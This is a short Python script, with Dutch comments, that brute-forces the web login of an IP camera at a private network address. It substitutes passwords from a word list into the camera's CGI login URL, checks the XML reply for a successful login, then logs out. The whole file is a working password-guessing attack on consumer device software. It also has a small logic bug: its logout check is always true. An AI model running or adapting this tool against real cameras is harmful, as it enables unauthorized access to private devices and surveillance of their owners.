
#File inladen
#URl ophalen
# Output checken
import requests
import sys

fileName = "./words.txt"
login_url = "http://192.168.178.122:88/cgi-bin/CGIProxy.fcgi?cmd=logIn&usrName=wificam&remoteIp=192.168.178.122&groupId=673982479&pwd=^PASS^&usr=wificam&pwd=^PASS^"
logout_url = "http://192.168.178.122:88/cgi-bin/CGIProxy.fcgi?cmd=logOut&usrName=wificam&remoteIp=192.168.178.122&groupId=673982479&usr=wificam&pwd=^PASS^"

def load_word_list(fileName):
	with open(fileName) as f:
		lineList = f.readlines()
		lineList = [line.rstrip('\n') for line in open(fileName)]
	return lineList

def parse_url(url, password):
	num_to_change = url.count("^PASS^")

	if num_to_change > 0:
		output = url.replace("^PASS^", password)
		return output		

def bruteforce(url, word_list):

	for word in word_list:
		print("Trying password: " + word)
		target = parse_url(url, word)

		result = requests.get(target).text
		if "<logInResult>0</logInResult>" in result:
			print("password found: ")
			logout(logout_url, word)
			return word

def logout(url, password):
	target = parse_url(url, password)
	result = requests.get(target).text

	if "<result>0</result>":
		print("Logout successful")
	else:
		print("Can't logout user")
		print(result)


def main():

	word_list = load_word_list(sys.argv[1]);
	#print(word_list)
	# #target = parse_url(url, "123455")
	
	password = bruteforce(login_url, word_list)
	print(password)


	return None


if __name__ == '__main__':
	main()